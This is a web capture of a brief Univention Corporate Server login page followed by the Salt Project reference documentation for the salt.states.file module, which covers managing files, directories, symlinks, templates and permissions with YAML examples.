=== Content from idp-portal.suse.com_6b95d262_20250115_201548.html ===

## UCS

# Welcome to Univention Corporate Server

## JavaScript required

A browser with JavaScript enabled is required in order to use this service.

When using Internet Explorer, please check your security settings and add this address to your trusted sites.



=== Content from docs.saltproject.io_59a3dcdd_20250115_125142.html ===


Toggle navigation

[![](https://gitlab.com/saltstack/open/salt-branding-guide/-/raw/master/logos/SaltProject_altlogo_teal.png)](https://saltproject.io/)

* [Overview](/en/latest/)
* [Salt User Guide](https://docs.saltproject.io/salt/user-guide/en/latest/)
* [Documentation](/en/latest/contents.html)
* [Downloads](https://repo.saltproject.io)
* [Develop](/en/latest/topics/development/)

[Edit on GitHub](https://github.com/saltstack/salt/edit/master/doc/ref/states/all/salt.states.file.rst)

* [Table of Contents](../../../contents.html "Table of Contents")
* [Glossary](../../../glossary.html "Glossary")
* [previous](salt.states.event.html "salt.states.event")
* [next](salt.states.firewall.html "salt.states.firewall")
* [all salt modules](../../../py-modindex.html "Salt Module Index")
* [routing table](../../../http-routingtable.html "HTTP Routing Table")
* [index](../../../genindex.html "General Index")
* [![](../../../_static/images/pdf_icon.svg)](/en/pdf/Salt-3007.1.pdf)
* [![](../../../_static/images/epub_icon.svg)](/en/epub/Salt-3007.1.epub)

# salt.states.file[¶](#module-salt.states.file "Permalink to this heading")

## Operations on regular files, special files, directories, and symlinks[¶](#operations-on-regular-files-special-files-directories-and-symlinks "Permalink to this heading")

Salt States can aggressively manipulate files on a system. There are a number
of ways in which files can be managed.

Regular files can be enforced with the [`file.managed`](#salt.states.file.managed "salt.states.file.managed") state. This state downloads files from the salt
master and places them on the target system. Managed files can be rendered as a
jinja, mako, or wempy template, adding a dynamic component to file management.
An example of [`file.managed`](#salt.states.file.managed "salt.states.file.managed") which makes use of
the jinja templating system would look like this:

```
/etc/http/conf/http.conf:
  file.managed:
    - source: salt://apache/http.conf
    - user: root
    - group: root
    - mode: 644
    - attrs: ai
    - template: jinja
    - defaults:
        custom_var: "default value"
        other_var: 123
{% if grains['os'] == 'Ubuntu' %}
    - context:
        custom_var: "override"
{% endif %}

```

It is also possible to use the [`py renderer`](../../renderers/all/salt.renderers.py.html#module-salt.renderers.py "salt.renderers.py") as a
templating option. The template would be a Python script which would need to
contain a function called `run()`, which returns a string. All arguments
to the state will be made available to the Python script as globals. The
returned string will be the contents of the managed file. For example:

```
def run():
    lines = ['foo', 'bar', 'baz']
    lines.extend([source, name, user, context])  # Arguments as globals
    return '\n\n'.join(lines)

```

Note

The `defaults` and `context` arguments require extra indentation (four
spaces instead of the normal two) in order to create a nested dictionary.
[More information](../../../topics/troubleshooting/yaml_idiosyncrasies.html#nested-dict-indentation).

If using a template, any user-defined template variables in the file defined in
`source` must be passed in using the `defaults` and/or `context`
arguments. The general best practice is to place default values in
`defaults`, with conditional overrides going into `context`, as seen above.

The template will receive a variable `custom_var`, which would be accessed in
the template using `{{ custom_var }}`. If the operating system is Ubuntu, the
value of the variable `custom_var` would be *override*, otherwise it is the
default *default value*

The `source` parameter can be specified as a list. If this is done, then the
first file to be matched will be the one that is used. This allows you to have
a default file on which to fall back if the desired file does not exist on the
salt fileserver. Here's an example:

```
/etc/foo.conf:
  file.managed:
    - source:
      - salt://foo.conf.{{ grains['fqdn'] }}
      - salt://foo.conf.fallback
    - user: foo
    - group: users
    - mode: 644
    - attrs: i
    - backup: minion

```

Note

Salt supports backing up managed files via the backup option. For more
details on this functionality please review the
[backup\_mode documentation](../backup_mode.html#file-state-backups).

The `source` parameter can also specify a file in another Salt environment.
In this example `foo.conf` in the `dev` environment will be used instead.

```
/etc/foo.conf:
  file.managed:
    - source:
      - 'salt://foo.conf?saltenv=dev'
    - user: foo
    - group: users
    - mode: '0644'
    - attrs: i

```

Warning

When using a mode that includes a leading zero you must wrap the
value in single quotes. If the value is not wrapped in quotes it
will be read by YAML as an integer and evaluated as an octal.

The `names` parameter, which is part of the state compiler, can be used to
expand the contents of a single state declaration into multiple, single state
declarations. Each item in the `names` list receives its own individual state
`name` and is converted into its own low-data structure. This is a convenient
way to manage several files with similar attributes.

```
salt_master_conf:
  file.managed:
    - user: root
    - group: root
    - mode: '0644'
    - names:
      - /etc/salt/master.d/master.conf:
        - source: salt://saltmaster/master.conf
      - /etc/salt/minion.d/minion-99.conf:
        - source: salt://saltmaster/minion.conf

```

Note

There is more documentation about this feature in the [Names declaration](../highstate.html#names-declaration) section of the [Highstate docs](../highstate.html#states-highstate).

Special files can be managed via the `mknod` function. This function will
create and enforce the permissions on a special file. The function supports the
creation of character devices, block devices, and FIFO pipes. The function will
create the directory structure up to the special file if it is needed on the
minion. The function will not overwrite or operate on (change major/minor
numbers) existing special files with the exception of user, group, and
permissions. In most cases the creation of some special files require root
permissions on the minion. This would require that the minion to be run as the
root user. Here is an example of a character device:

```
/var/named/chroot/dev/random:
  file.mknod:
    - ntype: c
    - major: 1
    - minor: 8
    - user: named
    - group: named
    - mode: 660

```

Here is an example of a block device:

```
/var/named/chroot/dev/loop0:
  file.mknod:
    - ntype: b
    - major: 7
    - minor: 0
    - user: named
    - group: named
    - mode: 660

```

Here is an example of a fifo pipe:

```
/var/named/chroot/var/log/logfifo:
  file.mknod:
    - ntype: p
    - user: named
    - group: named
    - mode: 660

```

Directories can be managed via the `directory` function. This function can
create and enforce the permissions on a directory. A directory statement will
look like this:

```
/srv/stuff/substuf:
  file.directory:
    - user: fred
    - group: users
    - mode: 755
    - makedirs: True

```

If you need to enforce user and/or group ownership or permissions recursively
on the directory's contents, you can do so by adding a `recurse` directive:

```
/srv/stuff/substuf:
  file.directory:
    - user: fred
    - group: users
    - mode: 755
    - makedirs: True
    - recurse:
      - user
      - group
      - mode

```

As a default, `mode` will resolve to `dir_mode` and `file_mode`, to
specify both directory and file permissions, use this form:

```
/srv/stuff/substuf:
  file.directory:
    - user: fred
    - group: users
    - file_mode: 744
    - dir_mode: 755
    - makedirs: True
    - recurse:
      - user
      - group
      - mode

```

Symlinks can be easily created; the symlink function is very simple and only
takes a few arguments:

```
/etc/grub.conf:
  file.symlink:
    - target: /boot/grub/grub.conf

```

Recursive directory management can also be set via the `recurse`
function. Recursive directory management allows for a directory on the salt
master to be recursively copied down to the minion. This is a great tool for
deploying large code and configuration systems. A state using `recurse`
would look something like this:

```
/opt/code/flask:
  file.recurse:
    - source: salt://code/flask
    - include_empty: True

```

A more complex `recurse` example:

```
{% set site_user = 'testuser' %}
{% set site_name = 'test_site' %}
{% set project_name = 'test_proj' %}
{% set sites_dir = 'test_dir' %}

django-project:
  file.recurse:
    - name: {{ sites_dir }}/{{ site_name }}/{{ project_name }}
    - user: {{ site_user }}
    - dir_mode: 2775
    - file_mode: '0644'
    - template: jinja
    - source: salt://project/templates_dir
    - include_empty: True

```

Retention scheduling can be applied to manage contents of backup directories.
For example:

```
/var/backups/example_directory:
  file.retention_schedule:
    - strptime_format: example_name_%Y%m%dT%H%M%S.tar.bz2
    - retain:
        most_recent: 5
        first_of_hour: 4
        first_of_day: 14
        first_of_week: 6
        first_of_month: 6
        first_of_year: all

```

salt.states.file.absent(*name*, *\*\*kwargs*)[¶](#salt.states.file.absent "Permalink to this definition")

Make sure that the named file or directory is absent. If it exists, it will
be deleted. This will work to reverse any of the functions in the file
state module. If a directory is supplied, it will be recursively deleted.

If only the contents of the directory need to be deleted but not the directory
itself, use [`file.directory`](#salt.states.file.directory "salt.states.file.directory") with `clean=True`

name

The path which should be deleted

salt.states.file.accumulated(*name*, *filename*, *text*, *\*\*kwargs*)[¶](#salt.states.file.accumulated "Permalink to this definition")

Prepare accumulator which can be used in template in file.managed state.
Accumulator dictionary becomes available in template. It can also be used
in file.blockreplace.

name

Accumulator name

filename

Filename which would receive this accumulator (see file.managed state
documentation about `name`)

text

String or list for adding in accumulator

require\_in / watch\_in

One of them required for sure we fill up accumulator before we manage
the file. Probably the same as filename

Example:

Given the following:

```
animals_doing_things:
  file.accumulated:
    - filename: /tmp/animal_file.txt
    - text: ' jumps over the lazy dog.'
    - require_in:
      - file: animal_file

animal_file:
  file.managed:
    - name: /tmp/animal_file.txt
    - source: salt://animal_file.txt
    - template: jinja

```

One might write a template for `animal_file.txt` like the following:

```
The quick brown fox{% for animal in accumulator['animals_doing_things'] %}{{ animal }}{% endfor %}

```

Collectively, the above states and template file will produce:

```
The quick brown fox jumps over the lazy dog.

```

Multiple accumulators can be "chained" together.

Note

The 'accumulator' data structure is a Python dictionary.
Do not expect any loop over the keys in a deterministic order!

salt.states.file.append(*name*, *text=None*, *makedirs=False*, *source=None*, *source\_hash=None*, *template='jinja'*, *sources=None*, *source\_hashes=None*, *defaults=None*, *context=None*, *ignore\_whitespace=True*)[¶](#salt.states.file.append "Permalink to this definition")

Ensure that some text appears at the end of a file.

The text will not be appended if it already exists in the file.
A single string of text or a list of strings may be appended.

name

The location of the file to append to.

text

The text to be appended, which can be a single string or a list
of strings.

makedirs

If the file is located in a path without a parent directory,
then the state will fail. If makedirs is set to True, then
the parent directories will be created to facilitate the
creation of the named file. Defaults to False.

source

A single source file to append. This source file can be hosted on either
the salt master server, or on an HTTP or FTP server. Both HTTPS and
HTTP are supported as well as downloading directly from Amazon S3
compatible URLs with both pre-configured and automatic IAM credentials
(see s3.get state documentation). File retrieval from Openstack Swift
object storage is supported via swift://container/object\_path URLs
(see swift.get documentation).

For files hosted on the salt file server, if the file is located on
the master in the directory named spam, and is called eggs, the source
string is salt://spam/eggs.

If the file is hosted on an HTTP or FTP server, the source\_hash argument
is also required.

source\_hash
This can be one of the following:

1. a source hash string
2. the URI of a file that contains source hash strings

The function accepts the first encountered long unbroken alphanumeric
string of correct length as a valid hash, in order from most secure to
least secure:

```
Type    Length
======  ======
sha512     128
sha384      96
sha256      64
sha224      56
sha1        40
md5         32

```

See the `source_hash` parameter description for [`file.managed`](#salt.states.file.managed "salt.states.file.managed") function for more details and examples.

template

The named templating engine will be used to render the appended-to file.
Defaults to `jinja`. The following templates are supported:

* [`cheetah`](../../renderers/all/salt.renderers.cheetah.html#module-salt.renderers.cheetah "salt.renderers.cheetah")
* [`genshi`](../../renderers/all/salt.renderers.genshi.html#module-salt.renderers.genshi "salt.renderers.genshi")
* [`jinja`](../../renderers/all/salt.renderers.jinja.html#module-salt.renderers.jinja "salt.renderers.jinja")
* [`mako`](../../renderers/all/salt.renderers.mako.html#module-salt.renderers.mako "salt.renderers.mako")
* [`py`](../../renderers/all/salt.renderers.py.html#module-salt.renderers.py "salt.renderers.py")
* [`wempy`](../../renderers/all/salt.renderers.wempy.html#module-salt.renderers.wempy "salt.renderers.wempy")

sources

A list of source files to append. If the files are hosted on an HTTP or
FTP server, the source\_hashes argument is also required.

source\_hashes

A list of source\_hashes corresponding to the sources list specified in
the sources argument.

defaults

Default context passed to the template.

context

Overrides default context variables passed to the template.

ignore\_whitespace

New in version 2015.8.4.

Spaces and Tabs in text are ignored by default, when searching for the
appending content, one space or multiple tabs are the same for salt.
Set this option to `False` if you want to change this behavior.

Multi-line example:

```
/etc/motd:
  file.append:
    - text: |
        Thou hadst better eat salt with the Philosophers of Greece,
        than sugar with the Courtiers of Italy.
        - Benjamin Franklin

```

Multiple lines of text:

```
/etc/motd:
  file.append:
    - text:
      - Trust no one unless you have eaten much salt with him.
      - "Salt is born of the purest of parents: the sun and the sea."

```

Gather text from multiple template files:

```
/etc/motd:
  file:
    - append
    - template: jinja
    - sources:
      - salt://motd/devops-messages.tmpl
      - salt://motd/hr-messages.tmpl
      - salt://motd/general-messages.tmpl

```

New in version 0.9.5.

salt.states.file.blockreplace(*name*, *marker\_start='#-- start managed zone --'*, *marker\_end='#-- end managed zone --'*, *source=None*, *source\_hash=None*, *template='jinja'*, *sources=None*, *source\_hashes=None*, *defaults=None*, *context=None*, *content=''*, *append\_if\_not\_found=False*, *prepend\_if\_not\_found=False*, *backup='.bak'*, *show\_changes=True*, *append\_newline=None*, *insert\_before\_match=None*, *insert\_after\_match=None*)[¶](#salt.states.file.blockreplace "Permalink to this definition")

Maintain an edit in a file in a zone delimited by two line markers

New in version 2014.1.0.

Changed in version 2017.7.5,2018.3.1: `append_newline` argument added. Additionally, to improve
idempotence, if the string represented by `marker_end` is found in
the middle of the line, the content preceding the marker will be
removed when the block is replaced. This allows one to remove
`append_newline: False` from the SLS and have the block properly
replaced if the end of the content block is immediately followed by the
`marker_end` (i.e. no newline before the marker).

A block of content delimited by comments can help you manage several lines
entries without worrying about old entries removal. This can help you
maintaining an un-managed file containing manual edits.

Note

This function will store two copies of the file in-memory (the original
version and the edited version) in order to detect changes and only
edit the targeted file if necessary.

Additionally, you can use [`file.accumulated`](#salt.states.file.accumulated "salt.states.file.accumulated") and target this state. All accumulated
data dictionaries' content will be added in the content block.

name

Filesystem path to the file to be edited

marker\_start

The line content identifying a line as the start of the content block.
Note that the whole line containing this marker will be considered, so
whitespace or extra content before or after the marker is included in
final output

marker\_end

The line content identifying the end of the content block. As of
versions 2017.7.5 and 2018.3.1, everything up to the text matching the
marker will be replaced, so it's important to ensure that your marker
includes the beginning of the text you wish to replace.

content

The content to be used between the two lines identified by
`marker_start` and `marker_end`

source

The source file to download to the minion, this source file can be
hosted on either the salt master server, or on an HTTP or FTP server.
Both HTTPS and HTTP are supported as well as downloading directly
from Amazon S3 compatible URLs with both pre-configured and automatic
IAM credentials. (see s3.get state documentation)
File retrieval from Openstack Swift object storage is supported via
swift://container/object\_path URLs, see swift.get documentation.
For files hosted on the salt file server, if the file is located on
the master in the directory named spam, and is called eggs, the source
string is salt://spam/eggs. If source is left blank or None
(use ~ in YAML), the file will be created as an empty file and
the content will not be managed. This is also the case when a file
already exists and the source is undefined; the contents of the file
will not be changed or managed.

If the file is hosted on a HTTP or FTP server then the source\_hash
argument is also required.

A list of sources can also be passed in to provide a default source and
a set of fallbacks. The first source in the list that is found to exist
will be used and subsequent entries in the list will be ignored.

```
file_override_example:
  file.blockreplace:
    - name: /etc/example.conf
    - source:
      - salt://file_that_does_not_exist
      - salt://file_that_exists

```

source\_hash
This can be one of the following:

1. a source hash string
2. the URI of a file that contains source hash strings

The function accepts the first encountered long unbroken alphanumeric
string of correct length as a valid hash, in order from most secure to
least secure:

```
Type    Length
======  ======
sha512     128
sha384      96
sha256      64
sha224      56
sha1        40
md5         32

```

See the `source_hash` parameter description for [`file.managed`](#salt.states.file.managed "salt.states.file.managed") function for more details and examples.

template

Templating engine to be used to render the downloaded file. The
following engines are supported:

* [`cheetah`](../../renderers/all/salt.renderers.cheetah.html#module-salt.renderers.cheetah "salt.renderers.cheetah")
* [`genshi`](../../renderers/all/salt.renderers.genshi.html#module-salt.renderers.genshi "salt.renderers.genshi")
* [`jinja`](../../renderers/all/salt.renderers.jinja.html#module-salt.renderers.jinja "salt.renderers.jinja")
* [`mako`](../../renderers/all/salt.renderers.mako.html#module-salt.renderers.mako "salt.renderers.mako")
* [`py`](../../renderers/all/salt.renderers.py.html#module-salt.renderers.py "salt.renderers.py")
* [`wempy`](../../renderers/all/salt.renderers.wempy.html#module-salt.renderers.wempy "salt.renderers.wempy")

context

Overrides default context variables passed to the template

defaults

Default context passed to the template

append\_if\_not\_found

If markers are not found and this option is set to `True`, the
content block will be appended to the file.

prepend\_if\_not\_found

If markers are not found and this option is set to `True`, the
content block will be prepended to the file.

insert\_before\_match

If markers are not found, this parameter can be set to a regex which will
insert the block before the first found occurrence in the file.

New in version 3001.

insert\_after\_match

If markers are not found, this parameter can be set to a regex which will
insert the block after the first found occurrence in the file.

New in version 3001.

backup

The file extension to use for a backup of the file if any edit is made.
Set this to `False` to skip making a backup.

show\_changes

Controls how changes are presented. If `True`, the `Changes`
section of the state return will contain a unified diff of the changes
made. If False, then it will contain a boolean (`True` if any changes
were made, otherwise `False`).

append\_newline

Controls whether or not a newline is appended to the content block. If
the value of this argument is `True` then a newline will be added to
the content block. If it is `False`, then a newline will *not* be
added to the content block. If it is unspecified, then a newline will
only be added to the content block if it does not already end in a
newline.

New in version 2017.7.5,2018.3.1.

Example of usage with an accumulator and with a variable:

```
{% set myvar = 42 %}
hosts-config-block-{{ myvar }}:
  file.blockreplace:
    - name: /etc/hosts
    - marker_start: "# START managed zone {{ myvar }} -DO-NOT-EDIT-"
    - marker_end: "# END managed zone {{ myvar }} --"
    - content: 'First line of content'
    - append_if_not_found: True
    - backup: '.bak'
    - show_changes: True

hosts-config-block-{{ myvar }}-accumulated1:
  file.accumulated:
    - filename: /etc/hosts
    - name: my-accumulator-{{ myvar }}
    - text: "text 2"
    - require_in:
      - file: hosts-config-block-{{ myvar }}

hosts-config-block-{{ myvar }}-accumulated2:
  file.accumulated:
    - filename: /etc/hosts
    - name: my-accumulator-{{ myvar }}
    - text: |
         text 3
         text 4
    - require_in:
      - file: hosts-config-block-{{ myvar }}

```

will generate and maintain a block of content in `/etc/hosts`:

```
# START managed zone 42 -DO-NOT-EDIT-
First line of content
text 2
text 3
text 4
# END managed zone 42 --

```

salt.states.file.cached(*name*, *source\_hash=''*, *source\_hash\_name=None*, *skip\_verify=False*, *saltenv='base'*, *use\_etag=False*, *source\_hash\_sig=None*, *signed\_by\_any=None*, *signed\_by\_all=None*, *keyring=None*, *gnupghome=None*)[¶](#salt.states.file.cached "Permalink to this definition")

New in version 2017.7.3.

Changed in version 3005.

Ensures that a file is saved to the minion's cache. This state is primarily
invoked by other states to ensure that we do not re-download a source file
if we do not need to.

name

The URL of the file to be cached. To cache a file from an environment
other than `base`, either use the `saltenv` argument or include the
saltenv in the URL (e.g. `salt://path/to/file.conf?saltenv=dev`).

Note

A list of URLs is not supported, this must be a single URL. If a
local file is passed here, then the state will obviously not try to
download anything, but it will compare a hash if one is specified.

source\_hash

See the documentation for this same argument in the
[`file.managed`](#salt.states.file.managed "salt.states.file.managed") state.

Note

For remote files not originating from the `salt://` fileserver,
such as http(s) or ftp servers, this state will not re-download the
file if the locally-cached copy matches this hash. This is done to
prevent unnecessary downloading on repeated runs of this state. To
update the cached copy of a file, it is necessary to update this
hash.

source\_hash\_name

See the documentation for this same argument in the
[`file.managed`](#salt.states.file.managed "salt.states.file.managed") state.

skip\_verify

See the documentation for this same argument in the
[`file.managed`](#salt.states.file.managed "salt.states.file.managed") state.

Note

Setting this to `True` will result in a copy of the file being
downloaded from a remote (http(s), ftp, etc.) source each time the
state is run.

saltenv

Used to specify the environment from which to download a file from the
Salt fileserver (i.e. those with `salt://` URL).

use\_etag

If `True`, remote http/https file sources will attempt to use the
ETag header to determine if the remote file needs to be downloaded.
This provides a lightweight mechanism for promptly refreshing files
changed on a web server without requiring a full hash comparison via
the `source_hash` parameter.

New in version 3005.

source\_hash\_sig

When `name` is a remote file source, `source_hash` is a file,
`skip_verify` is not true and `use_etag` is not true, ensure a
valid GPG signature exists on the source hash file.
Set this to `true` for an inline (clearsigned) signature, or to a
file URI retrievable by :py:func:`cp.cache\_file <salt.modules.cp.cache\_file>
for a detached one.

Note

A signature on the `source_hash` file is enforced regardless of
changes since its contents are used to check if an existing file
is in the correct state - but only for remote sources!

New in version 3007.0.

signed\_by\_any

When verifying `source_hash_sig`, require at least one valid signature
from one of a list of key fingerprints. This is passed to
[`gpg.verify`](../../modules/all/salt.modules.gpg.html#salt.modules.gpg.verify "salt.modules.gpg.verify").

New in version 3007.0.

signed\_by\_all

When verifying `source_hash_sig`, require a valid signature from each
of the key fingerprints in this list. This is passed to
[`gpg.verify`](../../modules/all/salt.modules.gpg.html#salt.modules.gpg.verify "salt.modules.gpg.verify").

New in version 3007.0.

keyring

When verifying signatures, use this keyring.

New in version 3007.0.

gnupghome

When verifying signatures, use this GnuPG home.

New in version 3007.0.

This state will in most cases not be useful in SLS files, but it is useful
when writing a state or remote-execution module that needs to make sure
that a file at a given URL has been downloaded to the cachedir. One example
of this is in the `archive.extracted`
state:

```
result = __states__['file.cached'](source_match,
                                   source_hash=source_hash,
                                   source_hash_name=source_hash_name,
                                   skip_verify=skip_verify,
                                   saltenv=__env__)

```

This will return a dictionary containing the state's return data, including
a `result` key which will state whether or not the state was successful.
Note that this will not catch exceptions, so it is best used within a
try/except.

Once this state has been run from within another state or remote-execution
module, the actual location of the cached file can be obtained using
[`cp.is_cached`](../../modules/all/salt.modules.cp.html#salt.modules.cp.is_cached "salt.modules.cp.is_cached"):

```
cached = __salt__['cp.is_cached'](source_match, saltenv=__env__)

```

This function will return the cached path of the file, or an empty string
if the file is not present in the minion cache.

salt.states.file.comment(*name*, *regex*, *char='#'*, *backup='.bak'*, *ignore\_missing=False*)[¶](#salt.states.file.comment "Permalink to this definition")

New in version 0.9.5.

Changed in version 3005.

Comment out specified lines in a file.

name

The full path to the file to be edited

regex

A regular expression used to find the lines that are to be commented;
this pattern will be wrapped in parenthesis and will move any
preceding/trailing `^` or `$` characters outside the parenthesis
(e.g., the pattern `^foo$` will be rewritten as `^(foo)$`)
Note that you \_need\_ the leading ^, otherwise each time you run
highstate, another comment char will be inserted.

char

The character to be inserted at the beginning of a line in order to
comment it out

backup

The file will be backed up before edit with this file extension

Warning

This backup will be overwritten each time `sed` / `comment` /
`uncomment` is called. Meaning the backup will only be useful
after the first invocation.

Set to False/None to not keep a backup.

ignore\_missing

Ignore a failure to find the regex in the file. This is useful for
scenarios where a line must only be commented if it is found in the
file.

New in version 3005.

Usage:

```
/etc/fstab:
  file.comment:
    - regex: ^bind 127.0.0.1

```

salt.states.file.copy\_(*name*, *source*, *force=False*, *makedirs=False*, *preserve=False*, *user=None*, *group=None*, *mode=None*, *dir\_mode=None*, *subdir=False*, *\*\*kwargs*)[¶](#salt.states.file.copy_ "Permalink to this definition")

If the file defined by the `source` option exists on the minion, copy it
to the named path. The file will not be overwritten if it already exists,
unless the `force` option is set to `True`.

Note

This state only copies files from one location on a minion to another
location on the same minion. For copying files from the master, use a
[`file.managed`](#salt.states.file.managed "salt.states.file.managed") state.

name

The location of the file to copy to

source

The location of the file to copy to the location specified with name

force

If the target location is present then the file will not be moved,
specify "force: True" to overwrite the target file

makedirs

If the target subdirectories don't exist create them

preserve

New in version 2015.5.0.

Set `preserve: True` to preserve user/group ownership and mode
after copying. Default is `False`. If `preserve` is set to `True`,
then user/group/mode attributes will be ignored.

user

New in version 2015.5.0.

The user to own the copied file, this defaults to the user salt is
running as on the minion. If `preserve` is set to `True`, then
this will be ignored

group

New in version 2015.5.0.

The group to own the copied file, this defaults to the group salt is
running as on the minion. If `preserve` is set to `True` or on
Windows this will be ignored

mode

New in version 2015.5.0.

The permissions to set on the copied file, aka 644, '0775', '4664'.
If `preserve` is set to `True`, then this will be ignored.
Not supported on Windows.

The default mode for new files and directories corresponds umask of salt
process. For existing files and directories it's not enforced.

dir\_mode

New in version 3006.0.

If directories are to be created, passing this option specifies the
permissions for those directories. If this is not set, directories
will be assigned permissions by adding the execute bit to the mode of
the files.

The default mode for new files and directories corresponds to the umask
of the salt process. Not enforced for existing files and directories.

subdir

New in version 2015.5.0.

If the name is a directory then place the file inside the named
directory

Note

The copy function accepts paths that are local to the Salt minion.
This function does not support salt://, http://, or the other
additional file paths that are supported by [`states.file.managed`](#salt.states.file.managed "salt.states.file.managed") and [`states.file.recurse`](#salt.states.file.recurse "salt.states.file.recurse").

Usage:

```
# Use 'copy', not 'copy_'
/etc/example.conf:
  file.copy:
    - source: /tmp/example.conf

```

salt.states.file.decode(*name*, *encoded\_data=None*, *contents\_pillar=None*, *encoding\_type='base64'*, *checksum='md5'*)[¶](#salt.states.file.decode "Permalink to this definition")

Decode an encoded file and write it to disk

New in version 2016.3.0.

name

Path of the file to be written.

encoded\_data

The encoded file. Either this option or `contents_pillar` must be
specified.

contents\_pillar

A Pillar path to the encoded file. Uses the same path syntax as
[`pillar.get`](../../modules/all/salt.modules.pillar.html#salt.modules.pillar.get "salt.modules.pillar.get"). The
[`hashutil.base64_encodefile`](../../modules/all/salt.modules.hashutil.html#salt.modules.hashutil.base64_encodefile "salt.modules.hashutil.base64_encodefile") function can load encoded
content into Pillar. Either this option or `encoded_data` must be
specified.

encoding\_type

The type of encoding.

checksum

The hashing algorithm to use to generate checksums. Wraps the
[`hashutil.digest`](../../modules/all/salt.modules.hashutil.html#salt.modules.hashutil.digest "salt.modules.hashutil.digest") execution
function.

Usage:

```
write_base64_encoded_string_to_a_file:
  file.decode:
    - name: /tmp/new_file
    - encoding_type: base64
    - contents_pillar: mypillar:thefile

# or

write_base64_encoded_string_to_a_file:
  file.decode:
    - name: /tmp/new_file
    - encoding_type: base64
    - encoded_data: |
        Z2V0IHNhbHRlZAo=

```

Be careful with multi-line strings that the YAML indentation is correct.
E.g.,

```
write_base64_encoded_string_to_a_file:
  file.decode:
    - name: /tmp/new_file
    - encoding_type: base64
    - encoded_data: |
        {{ salt.pillar.get('path:to:data') | indent(8) }}

```

salt.states.file.directory(*name*, *user=None*, *group=None*, *recurse=None*, *max\_depth=None*, *dir\_mode=None*, *file\_mode=None*, *makedirs=False*, *clean=False*, *require=None*, *exclude\_pat=None*, *follow\_symlinks=False*, *force=False*, *backupname=None*, *allow\_symlink=True*, *children\_only=False*, *win\_owner=None*, *win\_perms=None*, *win\_deny\_perms=None*, *win\_inheritance=True*, *win\_perms\_reset=False*, *\*\*kwargs*)[¶](#salt.states.file.directory "Permalink to this definition")

Ensure that a named directory is present and has the right perms

name

The location to create or manage a directory, as an absolute path

user

The user to own the directory; this defaults to the user salt is
running as on the minion

group

The group ownership set for the directory; this defaults to the group
salt is running as on the minion. On Windows, this is ignored

recurse

Enforce user/group ownership and mode of directory recursively. Accepts
a list of strings representing what you would like to recurse. If
`mode` is defined, will recurse on both `file_mode` and `dir_mode` if
they are defined. If `ignore_files` or `ignore_dirs` is included, files or
directories will be left unchanged respectively.
directories will be left unchanged respectively. If `silent` is defined,
individual file/directory change notifications will be suppressed.

Example:

```
/var/log/httpd:
  file.directory:
    - user: root
    - group: root
    - dir_mode: 755
    - file_mode: 644
    - recurse:
      - user
      - group
      - mode

```

Leave files or directories unchanged:

```
/var/log/httpd:
  file.directory:
    - user: root
    - group: root
    - dir_mode: 755
    - file_mode: 644
    - recurse:
      - user
      - group
      - mode
      - ignore_dirs

```

New in version 2015.5.0.

max\_depth

Limit the recursion depth. The default is no limit=None.
'max\_depth' and 'clean' are mutually exclusive.

New in version 2016.11.0.

dir\_mode / mode

The permissions mode to set any directories created. Not supported on
Windows.

The default mode for new files and directories corresponds umask of salt
process. For existing files and directories it's not enforced.

file\_mode

The permissions mode to set any files created if 'mode' is run in
'recurse'. This defaults to dir\_mode. Not supported on Windows.

The default mode for new files and directories corresponds umask of salt
process. For existing files and directories it's not enforced.

makedirs

If the directory is located in a path without a parent directory, then
the state will fail. If makedirs is set to True, then the parent
directories will be created to facilitate the creation of the named
file.

clean

Remove any files that are not referenced by a required `file` state.
See examples below for more info. If this option is set then everything
in this directory will be deleted unless it is required. 'clean' and
'max\_depth' are mutually exclusive.

require

Require other resources such as packages or files.

exclude\_pat

When 'clean' is set to True, exclude this pattern from removal list
and preserve in the destination.

follow\_symlinks

If the desired path is a symlink (or `recurse` is defined and a
symlink is encountered while recursing), follow it and check the
permissions of the directory/file to which the symlink points.

New in version 2014.1.4.

Changed in version 3001.1: If set to False symlinks permissions are ignored on Linux systems
because it does not support permissions modification. Symlinks
permissions are always 0o777 on Linux.

force

If the name of the directory exists and is not a directory and
force is set to False, the state will fail. If force is set to
True, the file in the way of the directory will be deleted to
make room for the directory, unless backupname is set,
then it will be renamed.

New in version 2014.7.0.

backupname

If the name of the directory exists and is not a directory, it will be
renamed to the backupname. If the backupname already
exists and force is False, the state will fail. Otherwise, the
backupname will be removed first.

New in version 2014.7.0.

allow\_symlink

If allow\_symlink is True and the specified path is a symlink, it will be
allowed to remain if it points to a directory. If allow\_symlink is False
then the state will fail, unless force is also set to True, in which case
it will be removed or renamed, depending on the value of the backupname
argument.

New in version 2014.7.0.

children\_only

If children\_only is True the base of a path is excluded when performing
a recursive operation. In case of /path/to/base, base will be ignored
while all of /path/to/base/\* are still operated on.

win\_owner

The owner of the directory. If this is not passed, user will be used. If
user is not passed, the account under which Salt is running will be
used.

New in version 2017.7.0.

win\_perms

A dictionary containing permissions to grant and their propagation. For
example: `{'Administrators': {'perms': 'full_control', 'applies_to':
'this_folder_only'}}` Can be a single basic perm or a list of advanced
perms. `perms` must be specified. `applies_to` is optional and
defaults to `this_folder_subfolder_files`.

New in version 2017.7.0.

win\_deny\_perms

A dictionary containing permissions to deny and their propagation. For
example: `{'Administrators': {'perms': 'full_control', 'applies_to':
'this_folder_only'}}` Can be a single basic perm or a list of advanced
perms.

New in version 2017.7.0.

win\_inheritance

True to inherit permissions from the parent directory, False not to
inherit permission.

New in version 2017.7.0.

win\_perms\_reset

If `True` the existing DACL will be cleared and replaced with the
settings defined in this function. If `False`, new entries will be
appended to the existing DACL. Default is `False`.

New in version 2018.3.0.

Here's an example using the above `win_*` parameters:

```
create_config_dir:
  file.directory:
    - name: 'C:\config\'
    - win_owner: Administrators
    - win_perms:
        # Basic Permissions
        dev_ops:
          perms: full_control
        # List of advanced permissions
        appuser:
          perms:
            - read_attributes
            - read_ea
            - create_folders
            - read_permissions
          applies_to: this_folder_only
        joe_snuffy:
          perms: read
          applies_to: this_folder_files
    - win_deny_perms:
        fred_snuffy:
          perms: full_control
    - win_inheritance: False

```

For `clean: True` there is no mechanism that allows all states and
modules to enumerate the files that they manage, so for file.directory to
know what files are managed by Salt, a `file` state targeting managed
files is required. To use a contrived example, the following states will
always have changes, despite the file named `okay` being created by a
Salt state:

```
silly_way_of_creating_a_file:
  cmd.run:
     - name: mkdir -p /tmp/dont/do/this && echo "seriously" > /tmp/dont/do/this/okay
     - unless: grep seriously /tmp/dont/do/this/okay

will_always_clean:
  file.directory:
    - name: /tmp/dont/do/this
    - clean: True

```

